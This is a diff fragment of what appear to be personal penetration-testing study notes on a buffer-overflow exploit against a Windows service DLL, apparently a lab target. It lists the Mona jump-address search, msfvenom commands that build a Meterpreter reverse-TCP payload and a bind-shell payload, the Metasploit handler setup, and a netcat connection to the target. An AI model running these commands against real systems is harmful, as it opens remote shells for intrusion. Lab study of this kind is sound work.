@@ -259,9 +259,9 @@ can use socket to execute on your Linux box
 Use Mona to get EIP overload address !mona jmp -r ESP -m “essfunc.dll”
 
 use this msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP_HERE lport=5555 b- “\x00” -f python to make a multihandler shell open on target
-msfconsole then use multi/handler and set the payload to what you set on msfvenom (windows/meterpreter/reverse_tcp)
+msfconsole then use multi/handler and set the payload to what you set on msfvenom (windows/meterpreter/reverse_tcp) and change lhost to 0.0.0.0 and lport to 5555 
 
-or use msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c and a nc -v <target> 4444 
+or use msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c and a nc -v <target> 4444 nvm it too big :::::::::::::::::::/
 
 =================================== POST EXPLOITATION ==================================
 
